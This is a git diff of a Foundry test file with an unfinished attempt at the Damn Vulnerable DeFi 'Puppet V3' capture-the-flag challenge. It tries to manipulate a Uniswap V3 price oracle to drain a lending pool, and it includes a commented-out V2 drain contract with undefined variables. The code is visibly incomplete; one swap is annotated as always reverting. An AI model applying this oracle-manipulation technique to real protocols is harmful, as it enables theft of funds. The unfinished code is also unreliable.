@@ -7,9 +7,11 @@ import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV
 import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
+import {FullMath} from "@uniswap/v3-core/contracts/libraries/FullMath.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -90,6 +92,11 @@ contract PuppetV3Challenge is Test {
             })
         );
 
+        console.log("Deployer WETH balance after adding liquidity:", weth.balanceOf(deployer));
+        console.log("Deployer DVT balance after adding liquidity:", token.balanceOf(deployer));
+        console.log("Uniswap pool WETH balance", weth.balanceOf(address(uniswapPool)));
+        console.log("Uniswap pool DVT balance", token.balanceOf(address(uniswapPool)));
+
         // Deploy the lending pool
         lendingPool = new PuppetV3Pool(weth, token, uniswapPool);
 
@@ -119,7 +126,94 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+
+        require(uniswapPool.token0() == address(token), "Token0 is expected to be DVT");
+
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        weth.approve(address(positionManager), type(uint256).max);
+        token.approve(address(positionManager), type(uint256).max);
+        // bool isWethFirst = address(weth) < address(token);
+        // console.log("weth is token0?", isWethFirst); // false
+
+        console.log("Player WETH balance before minting position:", weth.balanceOf(player));
+        console.log("Player DVT balance before minting position:", token.balanceOf(player));
+
+
+        positionManager.mint(
+            INonfungiblePositionManager.MintParams({
+                token0: address(token),
+                token1: address(weth),
+                tickLower: -150_000,
+                tickUpper: 0,
+                fee: FEE,
+                recipient: player,
+                amount0Desired: 1 ether,
+                amount1Desired: uint256(1 ether / uint256(887270)),
+                amount0Min: 0,
+                amount1Min: 0,
+                deadline: block.timestamp
+            })
+        );
+
+        console.log("Player WETH balance after minting position:", weth.balanceOf(player));
+        console.log("Player DVT balance after minting position:", token.balanceOf(player));
+        console.log("Uniswap pool WETH balance", weth.balanceOf(address(uniswapPool)));
+        console.log("Uniswap pool DVT balance", token.balanceOf(address(uniswapPool)));
+
+
+
+        weth.approve(address(uniswapPool), type(uint256).max);
+        token.approve(address(uniswapPool), type(uint256).max);
+
+        (uint160 sqrtPriceX96, , , , , , ) = uniswapPool.slot0();
+
+        // Price = (sqrtPriceX96^2 * 10^decimals0) / (2^192 * 10^decimals1)
+        uint256 Q192 = 1 << 192;
+        // no adjustment for decimals, since both WETH and DVT have 18 decimals
+        uint256 price = FullMath.mulDiv(
+            uint256(sqrtPriceX96), // Cast to uint256 for mulDiv
+            uint256(sqrtPriceX96),
+            Q192
+        );
+
+        console.log("Current price of DVT in WETH:", price);
+
+        (int256 amount0, int256 amount1) = uniswapPool.swap(
+            address(this),
+            false,
+            1,
+            10, // how to find this value, i always get SPL revert
+            bytes("")
+        );
+
+
+
+        // uint160 sqrtPriceLimitX96 = currentSqrtPriceX96 / 10;
+        // uint160 sqrtPriceLimitX96 = currentSqrtPriceX96 * 10 ether;
+
+        // uint160 sqrtPriceLimitX96 = currentSqrtPriceX96 * 11_000 / 10_000;
+
+        // weth.approve(address(uniswapPool), type(uint256).max);
+        // token.approve(address(uniswapPool), type(uint256).max);
+
+        // (int256 amount0, int256 amount1) = uniswapPool.swap(
+        //     address(this),
+        //     false, // DVT -> WETH
+        //     1000,
+        //     sqrtPriceLimitX96,
+        //     bytes("")
+        // );
+    }
+
+    function uniswapV3SwapCallback(
+        int256 amount0,
+        int256 amount1,
+        bytes calldata data
+    ) public{
+        console.log("UniswapV3SwapCallback called with amount0", amount0);
+        console.log("UniswapV3SwapCallback called with amount1", amount1);
+        weth.transfer(msg.sender, uint256(amount1));
     }
 
     /**
@@ -135,3 +229,66 @@ contract PuppetV3Challenge is Test {
         return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
     }
 }
+
+
+// contract Rescuer {
+//     DamnValuableToken token;
+//     PuppetV3Pool lendingPool;
+//     address recovery;
+
+//     constructor(
+
+
+//     ) payable {
+//         token = _token;
+//         lendingPool = _lendingPool;
+//         uniswapV2Exchange = _uniswapV2Exchange;
+//         uniswapV2Router = _uniswapV2Router;
+//         weth = _weth;
+//         recovery = _recovery;
+//     }
+
+//     function rescue() external {
+//         token.approve(address(uniswapV2Router), type(uint256).max);
+
+//         address[] memory path = new address[](2);
+//         path[0] = address(token);
+//         path[1] = address(weth);
+
+//         uniswapV2Router.swapExactTokensForETH(
+//             PLAYER_INITIAL_TOKEN_BALANCE, // amountIn
+//             1, // amountOutMin
+//             path,
+//             address(this), // to
+//             block.timestamp + 10 // deadline
+//         );
+
+//         (uint112 reserve0, uint112 reserve1, ) = uniswapV2Exchange.getReserves();
+//         address token0 = uniswapV2Exchange.token0();
+
+//         uint256 price; // price of token in WETH, using reserves from the exchange
+//         if (token0 == address(token)) {
+//             price = (uint256(reserve1) * 1 ether) / uint256(reserve0);
+//         } else {
+//             price = (uint256(reserve0) * 1 ether) / uint256(reserve1);
+//         }
+
+
+//         console.log("Oracle price (1 token per ETH): ", price);
+
+//         weth.deposit{value: address(this).balance}();
+
+//         weth.approve(address(lendingPool), type(uint256).max);
+
+//         lendingPool.borrow(1_000_000 ether);
+
+//         require(token.balanceOf(address(lendingPool)) == 0, "All tokens should have been borrowed");
+
+//         token.transfer(recovery, token.balanceOf(address(this)));
+
+//         weth.transfer(msg.sender, weth.balanceOf(address(this)));
+
+//     }
+
+//     receive()external payable {}
+// }
